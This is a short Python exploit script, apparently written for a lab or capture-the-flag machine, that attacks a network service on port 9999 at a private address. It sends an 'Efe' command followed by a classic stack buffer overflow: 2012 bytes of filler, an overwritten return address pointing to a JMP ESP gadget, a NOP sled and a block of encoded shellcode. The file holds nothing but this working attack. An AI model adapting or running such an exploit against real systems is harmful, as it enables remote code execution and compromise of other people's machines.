#!/usr/bin/env python3

import socket
import sys

ip='10.10.188.64'
port=9999

payload = ("\xbd\x7a\xe5\x7f\xdb\xd9\xc5\xd9\x74\x24\xf4\x58\x2b\xc9\xb1"
"\x52\x83\xe8\xfc\x31\x68\x0e\x03\x12\xeb\x9d\x2e\x1e\x1b\xe3"
"\xd1\xde\xdc\x84\x58\x3b\xed\x84\x3f\x48\x5e\x35\x4b\x1c\x53"
"\xbe\x19\xb4\xe0\xb2\xb5\xbb\x41\x78\xe0\xf2\x52\xd1\xd0\x95"
"\xd0\x28\x05\x75\xe8\xe2\x58\x74\x2d\x1e\x90\x24\xe6\x54\x07"
"\xd8\x83\x21\x94\x53\xdf\xa4\x9c\x80\xa8\xc7\x8d\x17\xa2\x91"
"\x0d\x96\x67\xaa\x07\x80\x64\x97\xde\x3b\x5e\x63\xe1\xed\xae"
"\x8c\x4e\xd0\x1e\x7f\x8e\x15\x98\x60\xe5\x6f\xda\x1d\xfe\xb4"
"\xa0\xf9\x8b\x2e\x02\x89\x2c\x8a\xb2\x5e\xaa\x59\xb8\x2b\xb8"
"\x05\xdd\xaa\x6d\x3e\xd9\x27\x90\x90\x6b\x73\xb7\x34\x37\x27"
"\xd6\x6d\x9d\x86\xe7\x6d\x7e\x76\x42\xe6\x93\x63\xff\xa5\xfb"
"\x40\x32\x55\xfc\xce\x45\x26\xce\x51\xfe\xa0\x62\x19\xd8\x37"
"\x84\x30\x9c\xa7\x7b\xbb\xdd\xee\xbf\xef\x8d\x98\x16\x90\x45"
"\x58\x96\x45\xc9\x08\x38\x36\xaa\xf8\xf8\xe6\x42\x12\xf7\xd9"
"\x73\x1d\xdd\x71\x19\xe4\xb6\x77\xd5\xd3\x0c\xe0\xeb\x1b\x80"
"\x31\x62\xfd\xc8\xa1\x23\x56\x65\x5b\x6e\x2c\x14\xa4\xa4\x49"
"\x16\x2e\x4b\xae\xd9\xc7\x26\xbc\x8e\x27\x7d\x9e\x19\x37\xab"
"\xb6\xc6\xaa\x30\x46\x80\xd6\xee\x11\xc5\x29\xe7\xf7\xfb\x10"
"\x51\xe5\x01\xc4\x9a\xad\xdd\x35\x24\x2c\x93\x02\x02\x3e\x6d"
"\x8a\x0e\x6a\x21\xdd\xd8\xc4\x87\xb7\xaa\xbe\x51\x6b\x65\x56"
"\x27\x47\xb6\x20\x28\x82\x40\xcc\x99\x7b\x15\xf3\x16\xec\x91"
"\x8c\x4a\x8c\x5e\x47\xcf\xac\xbc\x4d\x3a\x45\x19\x04\x87\x08"
"\x9a\xf3\xc4\x34\x19\xf1\xb4\xc2\x01\x70\xb0\x8f\x85\x69\xc8"
"\x80\x63\x8d\x7f\xa0\xa1")

command = "Efe"
filler = "A" * 2012
EIP = "\xdf\x14\x50\x62" #625011AF
#offset = "C" * 4
nops = "\x90" * 32
buffer = filler + EIP + nops + payload

try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("10.10.188.64",9999))
    s.recv(1024)
    s.recv(1024)
    s.send(command + "\r\n")
    s.recv(1024)
    s.send(buffer + "\r\n")
    s.close()

except:
   print("Application crashed")
   sys.exit()